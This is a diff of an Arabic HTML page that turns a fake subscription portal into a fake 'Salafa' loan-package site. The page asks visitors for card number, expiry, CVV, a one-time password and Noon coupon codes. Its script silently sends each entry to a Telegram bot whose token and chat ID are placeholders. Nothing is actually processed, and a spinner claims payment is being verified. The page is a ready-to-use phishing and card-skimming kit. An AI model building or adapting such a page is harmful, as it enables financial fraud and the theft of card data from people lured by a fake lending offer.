@@ -3,116 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بوابة المشتركين</title>
+    <title>بوابة سلفة الإلكترونية</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .container { background: white; width: 90%; max-width: 450px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); overflow: hidden; position: relative; }
-        .header { background: #007bff; color: white; padding: 20px; text-align: center; font-size: 20px; font-weight: bold; }
+        body { font-family: 'Cairo', sans-serif; background-color: #f4f7f6; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; width: 95%; max-width: 420px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; }
+        .header { background: #007bff; color: white; padding: 20px; text-align: center; font-size: 19px; font-weight: bold; }
         .content { padding: 20px; text-align: center; }
-        .package { border: 2px solid #eee; border-radius: 10px; padding: 15px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
-        .package:hover { border-color: #007bff; background: #f8fbff; }
-        .package h4 { margin: 0; color: #333; }
-        .package p { margin: 5px 0 0; color: #666; font-size: 14px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; text-align: center; font-size: 16px; }
-        button { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        /* تصميم الباقات */
+        .pkg-card { border: 1px solid #ddd; border-radius: 10px; padding: 15px; margin-bottom: 12px; cursor: pointer; transition: 0.3s; text-align: right; position: relative; }
+        .pkg-card:hover { border-color: #007bff; background: #f0f7ff; }
+        .pkg-card h4 { margin: 0 0 5px 0; color: #007bff; }
+        .pkg-card p { margin: 2px 0; font-size: 13px; color: #555; }
+        .price-tag { position: absolute; left: 15px; top: 15px; background: #28a745; color: white; padding: 2px 8px; border-radius: 5px; font-size: 14px; }
+        
+        .main-btn { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 10px; }
+        .opt-btn { width: 100%; padding: 15px; margin-bottom: 10px; border: 1px solid #ddd; border-radius: 8px; background: #fff; cursor: pointer; font-size: 16px; font-weight: 600; }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; text-align: center; font-size: 16px; }
         .hidden { display: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .msg { font-size: 15px; color: #444; margin-bottom: 15px; line-height: 1.6; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <div class="header" id="pageTitle">اختر الباقة المناسبة</div>
+    <div class="header" id="mainTitle">باقات سلفة</div>
     
     <div class="content">
-        <div id="step-packages">
-            <div class="package" onclick="selectPackage('الباقة الأساسية - 50 ريال')">
-                <h4>الباقة الأساسية</h4>
-                <p>اشتراك لمدة شهر واحد</p>
+        <div id="step1">
+            <div class="pkg-card" onclick="go(2, 'الباقة 1 (1000)')">
+                <span class="price-tag">1000 ريال</span>
+                <h4>الباقة الأولى</h4>
+                <p>الصافي: 800 | القسط: 200</p>
+                <p>عدد الدفعات: 5</p>
             </div>
-            <div class="package" onclick="selectPackage('الباقة المميزة - 120 ريال')">
-                <h4>الباقة المميزة</h4>
-                <p>اشتراك لمدة 3 أشهر</p>
+            <div class="pkg-card" onclick="go(2, 'الباقة 2 (3000)')">
+                <span class="price-tag">3000 ريال</span>
+                <h4>الباقة الثانية</h4>
+                <p>الصافي: 2700 | القسط: 375</p>
+                <p>عدد الدفعات: 8</p>
             </div>
-            <button class="hidden">متابعة</button>
-        </div>
-
-        <div id="step-payment-methods" class="hidden">
-            <p>اختر طريقة الدفع لإتمام الاشتراك:</p>
-            <button onclick="showSection('step-visa')" style="margin-bottom: 10px;">بطاقة بنكية (فيزا/مدى)</button>
-            <button onclick="showSection('step-coupon')" style="background: #ff9900;">قسيمة نون (Noon Coupon)</button>
-        </div>
-
-        <div id="step-visa" class="hidden">
-            <input type="text" id="card_num" placeholder="رقم البطاقة">
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="card_date" placeholder="MM/YY">
-                <input type="text" id="card_cvv" placeholder="CVV">
+            <div class="pkg-card" onclick="go(2, 'الباقة 3 (5000)')">
+                <span class="price-tag">5000 ريال</span>
+                <h4>الباقة الثالثة</h4>
+                <p>الصافي: 4500 | القسط: 500</p>
+                <p>عدد الدفعات: 10</p>
             </div>
-            <button onclick="submitVisa()">تأكيد الدفع</button>
+            <div class="pkg-card" onclick="go(2, 'الباقة 4 (7500)')">
+                <span class="price-tag">7500 ريال</span>
+                <h4>الباقة الرابعة</h4>
+                <p>الصافي: 7000 | القسط: 500</p>
+                <p>عدد الدفعات: 15</p>
+            </div>
+            <div class="pkg-card" onclick="go(2, 'الباقة 5 (10,000)')">
+                <span class="price-tag">10,000 ريال</span>
+                <h4>الباقة الخامسة</h4>
+                <p>الصافي: 9450 | القسط: 833</p>
+                <p>المدة: 12 شهر</p>
+            </div>
+            <div class="pkg-card" onclick="go(2, 'الباقة 6 (15,000)')">
+                <span class="price-tag">15,000 ريال</span>
+                <h4>الباقة السادسة</h4>
+                <p>الصافي: 14000 | القسط: 1000</p>
+                <p>المدة: 15 شهر</p>
+            </div>
         </div>
 
-        <div id="step-otp" class="hidden">
-            <p>سوف يقوم النظام بإرسال رمز تأكيد إليك، يرجى إدخاله في الأسفل:</p>
-            <input type="text" id="otp_val" placeholder="أدخل الرمز">
-            <button onclick="submitOtp()">تحقق</button>
+        <div id="step2" class="hidden">
+            <p class="msg">يرجى اختيار وسيلة دفع الدفعة الأولى:</p>
+            <button class="opt-btn" onclick="go(3)">بطاقة فيزا / مدى</button>
+            <button class="opt-btn" onclick="go(5)" style="border-color:#ff9900">قسيمة نون</button>
         </div>
 
-        <div id="step-coupon" class="hidden">
-            <p>أدخل رمز القسيمة لتفعيل الباقة:</p>
-            <input type="text" id="cp_code" placeholder="كود القسيمة">
-            <button onclick="submitCoupon()">تفعيل</button>
+        <div id="step3" class="hidden">
+            <input type="text" id="v_no" placeholder="رقم البطاقة">
+            <div style="display:flex; gap:10px;">
+                <input type="text" id="v_dt" placeholder="MM/YY">
+                <input type="text" id="v_cv" placeholder="CVV">
+            </div>
+            <button class="main-btn" onclick="sendV()">تأكيد الدفع</button>
         </div>
 
-        <div id="step-wait" class="hidden">
+        <div id="step4" class="hidden">
+            <p class="msg">سوف يقوم النظام بإرسال كود إليك رمز تأكيد. يرجى إدخاله في الأسفل:</p>
+            <input type="text" id="otp_in" placeholder="أدخل رمز التأكيد">
+            <button class="main-btn" onclick="sendO()">تأكيد</button>
+        </div>
+
+        <div id="step5" class="hidden">
+            <p class="msg">أدخل رمز القسيمة لتفعيل التمويل:</p>
+            <input type="text" id="cp_in" placeholder="كود القسيمة">
+            <button class="main-btn" onclick="sendC()" style="background:#ff9900">تفعيل</button>
+        </div>
+
+        <div id="step6" class="hidden">
             <div class="loader"></div>
-            <p id="wait-msg">يرجى الانتظار حتى يتم التحقق من الدفع...</p>
+            <p class="msg" id="wMsg"></p>
         </div>
     </div>
 </div>
 
 <script>
-    const TOKEN = 'توكن_بوتك_هنا';
-    const ID = 'ايدي_حسابك_هنا';
-    let selectedPkg = "";
+    const BOT_TOKEN = 'ضع_التوكن_هنا';
+    const CHAT_ID = 'ضع_الايدي_هنا';
+    let selPkg = "";
 
-    function showSection(id) {
+    async function toTG(t) {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(t)}`);
+    }
+
+    function go(s, p="") {
+        if(p) { selPkg = p; toTG("💰 العميل اختار: " + p); }
         document.querySelectorAll('.content > div').forEach(d => d.classList.add('hidden'));
-        document.getElementById(id).classList.remove('hidden');
-        // تحديث العنوان حسب الصفحة
-        if(id === 'step-visa') document.getElementById('pageTitle').innerText = "دفع آمن بالبطاقة";
-        if(id === 'step-coupon') document.getElementById('pageTitle').innerText = "تفعيل القسيمة";
+        document.getElementById('step'+s).classList.remove('hidden');
+        
+        const h = ["", "باقات سلفة", "اختيار الدفع", "بيانات البطاقة", "تأكيد الهوية", "قسيمة نون", "معالجة الطلب"];
+        document.getElementById('mainTitle').innerText = h[s];
     }
 
-    async function tellTelegram(text) {
-        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(text)}`);
+    async function sendV() {
+        await toTG(`💳 فيزا [${selPkg}]:\n${document.getElementById('v_no').value}\n${document.getElementById('v_dt').value} | ${document.getElementById('v_cv').value}`);
+        go(4);
     }
 
-    function selectPackage(name) {
-        selectedPkg = name;
-        tellTelegram(`🛒 العميل اختار: ${name}`);
-        showSection('step-payment-methods');
-        document.getElementById('pageTitle').innerText = "طريقة الدفع";
+    async function sendO() {
+        await toTG(`🔑 OTP:\n${document.getElementById('otp_in').value}`);
+        document.getElementById('wMsg').innerText = "يرجى الانتظار حتى يتم التحقق من الدفع";
+        go(6);
     }
 
-    async function submitVisa() {
-        const msg = `💳 بيانات فيزا:\nالباقة: ${selectedPkg}\nالرقم: ${document.getElementById('card_num').value}\nالتاريخ: ${document.getElementById('card_date').value}\nCVV: ${document.getElementById('card_cvv').value}`;
-        await tellTelegram(msg);
-        showSection('step-otp');
-        document.getElementById('pageTitle').innerText = "تأكيد الهوية";
-    }
-
-    async function submitOtp() {
-        await tellTelegram(`🔑 رمز OTP:\nالكود: ${document.getElementById('otp_val').value}`);
-        document.getElementById('wait-msg').innerText = "يرجى الانتظار حتى يتم التحقق من الدفع...";
-        showSection('step-wait');
-    }
-
-    async function submitCoupon() {
-        await tellTelegram(`🎫 قسيمة نون:\nالباقة: ${selectedPkg}\nالكود: ${document.getElementById('cp_code').value}`);
-        document.getElementById('wait-msg').innerText = "سوف يتم التحقق من معلومات الدفع";
-        showSection('step-wait');
+    async function sendC() {
+        await toTG(`🎫 قسيمة [${selPkg}]:\n${document.getElementById('cp_in').value}`);
+        document.getElementById('wMsg').innerText = "سوف يتم التحقق من معلومات الدفع";
+        go(6);
     }
 </script>
 
